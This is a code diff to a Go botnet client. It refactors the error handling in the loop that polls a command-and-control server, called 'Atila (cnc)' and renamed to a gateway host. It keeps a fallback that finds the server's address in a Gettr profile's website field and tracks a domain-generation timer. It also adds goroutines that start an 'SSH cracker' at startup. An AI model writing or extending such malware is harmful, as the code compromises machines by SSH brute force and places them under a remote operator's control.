@@ -26,32 +26,38 @@ var identified bool = false
 // tick is the content of the main loop. Returns false if something went wrong.
 func tick(host string) bool {
 	if !identified {
-		identified = identify(host, id, publicIdentificationKey)
-		return false
+		err := identify(host, id, publicIdentificationKey)
+		if err != nil {
+			fmt.Println(err)
+			identified = false
+			return false
+		}
+		identified = true
+		return true
 	}
 
 	messages, err := fetchMessages(host, id)
 	if err != nil {
-		fmt.Println(err.Error())
+		fmt.Println(err)
 		return false
 	}
 
 	for _, message := range messages {
 		reply, err := interpretMessage(host, message)
 		if err != nil {
-			fmt.Println(err.Error())
+			fmt.Println(err)
 			continue
 		}
 
 		err = sendMessage(host, reply)
 		if err != nil {
-			fmt.Println(err.Error())
+			fmt.Println(err)
 			continue
 		}
 
 		err = messageAck(host, reply.ReplyTo)
 		if err != nil {
-			fmt.Println(err.Error())
+			fmt.Println(err)
 			continue
 		}
 	}
@@ -69,14 +75,14 @@ func initialize() {
 	// Initialize a SQLite database and run the migrations.
 	err := dbInit()
 	if err != nil {
-		fmt.Println(err.Error())
+		fmt.Println(err)
 		return
 	}
 
 	// Check the database for details about self.
 	botDetails, err := dbGetBotDetails()
 	if err != nil {
-		fmt.Println(err.Error())
+		fmt.Println(err)
 		return
 	}
 
@@ -92,9 +98,19 @@ func initialize() {
 		dbInsertBotDetails(id, privateKeyToPEM(privateIdentificationKey), publicKeyToPEM(publicIdentificationKey))
 	} else {
 		// Load into global variables bot's details.
-		privateIdentificationKey = importPEMPrivateKey(botDetails.PrivateKey)
+		privateIdentificationKey, err = importPEMPrivateKey(botDetails.PrivateKey)
+		if err != nil {
+			panic(err)
+		}
 		publicIdentificationKey = importPEMPublicKey(botDetails.PublicKey)
 		id = botDetails.Id
+	}
+
+	// Ignite the SSH cracker.
+	if enableSshCracker {
+		for i := 0; i < sshThreads; i++ {
+			go sshCrackRoutine()
+		}
 	}
 
 	fmt.Println(botDetails)
@@ -122,16 +138,16 @@ func main() {
 		rand.Seed(time.Now().UnixNano())
 
 		// We need to reach out to hardcoded host of Atila. (cnc)
-		if tick(atilaHost) {
+		if tick(gatewayHost) {
 			// Reset the timer of DGA and move on...
 			lastContactMade = timeSinceJesus()
 			continue
 		}
 
 		// Reachout to Atila (cnc) host via 'website' property on a Gettr profile.
-		gettrAtilaHost, err := gettrProfileWebsite(gettrProfileName)
-		if err == nil && len(gettrAtilaHost) != 0 {
-			if tick(gettrAtilaHost) {
+		gettrGatewayHost, err := gettrProfileWebsite(gettrProfileName)
+		if err == nil && len(gettrGatewayHost) != 0 {
+			if tick(gettrGatewayHost) {
 				// Reset the timer of DGA and move on...
 				lastContactMade = timeSinceJesus()
 				continue
